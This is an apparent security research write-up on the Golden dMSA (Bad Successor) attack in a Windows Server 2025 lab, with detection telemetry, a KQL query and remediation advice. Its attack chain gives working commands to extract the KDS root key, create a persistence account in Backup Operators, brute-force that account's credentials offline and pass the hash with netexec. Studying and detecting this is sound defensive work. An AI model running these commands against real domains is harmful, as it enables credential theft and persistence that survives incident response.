# Golden dMSA (Bad Successor) — CVE-2025-53779
## Offline Credential Derivation from the KDS Root Key

**Platform:** Windows Server 2025  
**UBR:** 26100.32690  
**Domain:** badsuccessor.local  
**Status:** No patch or architectural mitigation exists as of May 2026  
**Series:** Vector Research — Identity & Credential Attack Surface

---

## Overview

The Golden dMSA attack, disclosed as CVE-2025-53779 and commonly referred to as Bad Successor, allows an attacker with Domain Admin access to derive valid, current credentials for any Group Managed Service Account (gMSA) or Delegated Managed Service Account (dMSA). Once the KDS root key is obtained from a domain controller, credential derivation becomes entirely offline — no LSASS, no DCSync, no password to reset.

The point is not the initial compromise. The point is what survives IR.

---

## Why This Is Different

To understand the persistence problem, it helps to understand what the KDS root key actually is.

The Key Distribution Service (KDS) root key is a domain-wide cryptographic secret stored on every domain controller. It is the root of trust for all managed service account password generation. Every gMSA and dMSA password is deterministically derived from it — which means that anyone who possesses the root key can derive valid managed service account credentials deterministically, without interacting with the domain again.

This is not a bug in the traditional sense. It is how the architecture works.

The security assumption baked into the design is that the KDS root key is inaccessible to anyone without Domain Admin. That assumption is correct. What the design does not account for is what happens after a DA-level compromise is detected and remediation begins — because the key itself is not part of standard IR remediation procedures.

Resetting privileged accounts does not invalidate credentials previously derived from the KDS root key. Unless the key itself is rotated — a procedure absent from most IR playbooks and difficult to execute safely at scale — the trust relationship persists.

---

## The IR Survivability Problem

Standard post-compromise remediation typically involves:

- Rotating all privileged account passwords
- Disabling or removing accounts created by the attacker
- Rotating krbtgt twice to invalidate Kerberos tickets
- Reviewing and revoking suspicious access

None of these steps touch the KDS root key. An attacker who derived gMSA or dMSA credentials before remediation began retains valid, current credentials after it completes. The account authenticates. The domain accepts it. The IR team has declared the environment clean.

Experts in the field consistently emphasize that remediating an environment without sufficient forensic verification of what was touched — and what persists — is a direct path to repeat compromise. Golden dMSA represents exactly that gap: a credential surface that standard reset procedures do not reach, attached to accounts that are environmentally common and therefore unlikely to attract attention.

---

## Attack Chain

### Entry Condition

Domain Admin / SYSTEM on a domain controller. In this lab, obtained via goexec scheduled task delivery of a fileless encoded PowerShell payload — no binary on disk, no interactive logon, no RDP.

### KDS Root Key Extraction

With SYSTEM on the DC, goldendMSA extracts the KDS root key directly from the domain:

```cmd
C:\Windows\Temp\goldendMSA.exe kds --domain badsuccessor.local
```

Two keys returned — GUIDs and Base64 blobs. This is the only step requiring DC access. Everything that follows is offline.

### Account Creation and Weaponization

```powershell
New-ADServiceAccount -Name "svc-golden" -DNSHostName "svc-golden.badsuccessor.local" -PrincipalsAllowedToRetrieveManagedPassword "WIN-52H4TKKPD9C$"
Add-ADGroupMember -Identity "Backup Operators" -Members "svc-golden$"
```

`svc-golden$` is created and added to Backup Operators. A realistic service account in a privileged group — exactly the kind of account that survives a cursory post-incident review.

### Offline Credential Derivation

From a domain-joined machine, enumerate the account's SID and root key association via LDAP. Generate the wordlist and bruteforce offline:

```cmd
goldendMSA.exe bruteforce -s <SID> -i <KDS-GUID> -k <KDS-Base64> -d badsuccessor.local -u svc-golden$ -t
```

Result: NTLM hash, AES-256, AES-128, and a valid Kerberos ticket — imported directly.

### Authentication

```bash
netexec smb 192.168.1.76 -u 'svc-golden$' -H <NTLM> -d badsuccessor.local
# [+] badsuccessor.local\svc-golden$
```

Valid. Backup Operators membership confirmed via LDAP. Both NTLM and Kerberos authentication paths succeed.

---

## Telemetry

| EID | Signal | Host | Default? |
|-----|--------|------|----------|
| 4662 | KDS root key container read | DC02 | No — requires SACL |
| Sysmon 1 | Base64 encoded payload in CommandLine | DC02 | No — requires Sysmon + rule |
| Sysmon 1 | Unsigned binary, zeroed IMPHASH | WIN-52H4TKKPD9C | No — requires Sysmon + rule |
| 4768 | TGT issued for svc-golden$ | DC02 | Yes — if Kerberos auditing enabled |
| 4624 x19 | Successful network logon — svc-golden$ | DC02 | Yes — if logon auditing enabled |

### What the Telemetry Actually Tells You

**EID 4662** fires on every read of the KDS root key container. In this lab, 601 events were generated across the session — mostly background DC reads. The signal is real but requires filtering:

```kql
event.code: "4662" and winlog.event_data.ObjectType: *19195a5b*
  and not winlog.event_data.SubjectUserName: "DC02$"
```

Even filtered, noise from other machine accounts remains. EID 4662 is best treated as a supporting artifact to be correlated with a higher-fidelity primary signal — not a standalone alert.

**Sysmon zeroed IMPHASH** is the highest-fidelity standalone signal in this chain. goldendMSA.exe carries no import hash and no publisher. Execution of an unsigned, publisher-less binary from a staging path is a reliable indicator regardless of what the binary is actually doing.

**EID 4768** is clean. One TGT request for a service account outside of normal service startup windows is anomalous. In this lab, a single event fired — directly tied to the bruteforce ticket import.

**EID 4624** captured both auth paths: NTLM from Kali (192.168.1.218) and Kerberos from the domain-joined member (192.168.1.188). The shared Logon GUID across Kerberos sessions enables correlation.

None of this telemetry is wired up in default configurations. The detection window closes the moment the Defender exclusion is removed.

---

## Remediation

The behavior is inherent to the current KDS/gMSA architecture. No vendor patch or architectural mitigation exists as of May 2026.

Semperis documents a sanitization path involving KDS root key rotation. Key caveats apply:

- gMSA password caching means derived credentials may remain valid on endpoints that have cached the managed password, even after key rotation
- No dMSA-specific remediation guidance exists from Microsoft as of May 2026
- The rotation procedure is complex and absent from most IR runbooks

**Minimum defensive posture:**

- Add SACL to `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration` — enables EID 4662 visibility
- Enable DS Access auditing: `auditpol /set /subcategory:"Directory Service Access" /success:enable`
- Deploy Sysmon with zeroed IMPHASH and encoded CommandLine detection rules
- Include KDS root key assessment and rotation in IR runbooks for any domain compromise scenario

---

## Research Taxonomy

**Control surface:** KDS root key — accessible to SYSTEM on any DC, provides offline derivation of all managed service account credentials domain-wide

**Risk surface:** Credential persistence through IR — derived credentials remain valid after standard remediation procedures complete

**Telemetry surface:** EID 4662 requires explicit SACL configuration; Sysmon rules require explicit deployment; neither is present by default

**Classification:** No patch or architectural mitigation exists as of May 2026. The attack surface is a function of the KDS design, not an implementation defect.

**Assumptions broken:** Password reset = credential invalidation. This assumption does not hold for gMSA/dMSA credentials derived from the KDS root key prior to key rotation.

---

## References

- CVE-2025-53779 (Bad Successor)
- [Semperis — Golden gMSA recovery guidance](https://www.semperis.com)
- [goldendMSA tool](https://github.com/Semperis/GoldenDMSA)


Initial attack








